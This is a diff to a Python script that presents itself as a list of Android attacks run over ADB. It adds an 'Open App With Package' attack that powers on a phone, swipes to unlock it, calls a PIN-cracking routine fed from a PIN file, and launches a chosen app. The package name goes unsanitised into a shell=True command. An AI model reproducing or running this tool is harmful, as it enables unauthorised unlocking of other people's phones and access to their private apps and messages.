@@ -8,7 +8,6 @@ class Main:
 		#print('constructuor')
 		#display banner
 		self.banner()
-		#self.file = input("Dic List To Crack Pin : ")
 		self.path = input("Enter Pin File : ")
 
 	def banner(self):
@@ -31,6 +30,7 @@ class Main:
 		print('----Attack List----')
 		print('1. Chrome With Link')
 		print('2. send msg on whatsapp')
+		print('3. Open App With Package')
 		print('\n')
 		atk = input("Choose Attack : ")
 		return atk
@@ -133,6 +133,27 @@ class Main:
 				time.sleep(wait[i])
 			print(f"Task : {i+1} {task[i]} : Done")
 
+	def openApp(self):
+		time.sleep(1)
+		pkg = input('Enter Package Name : ')
+		cmd = [
+                        "keyevent 26",
+                        "swipe 407 1211 378 85",
+                        "For Crack The PIN",
+                        "FOR OPEN PACKAGE",
+                        ]
+		wait = [0.5,0.2,0.4,2]
+		task =["Power On","Unlock Phone","Cracking Pin","Open Application"]
+		for i in range(len(cmd)):
+                        if i==2:
+                                self.crackPin()
+                        elif i == 3:
+                                sp.call(f"adb shell monkey -p {pkg} -c android.intent.category.LAUNCHER 1",shell=True)
+                        else:
+                                sp.call(f"adb shell input {cmd[i]}",shell=True) 
+                                time.sleep(wait[i])
+                        print(f"Task : {i+1} {task[i]} : Done")
+
 	def run(self):
 		atk = self.attackList()
 		#print(atk)
@@ -141,6 +162,8 @@ class Main:
 			self.chrome()
 		elif atk == "2":
 			self.whatsapp()
+		elif atk == "3":
+			self.openApp()
 		#sp.call("adb devices",shell=True)
 main = Main()
 main.run()
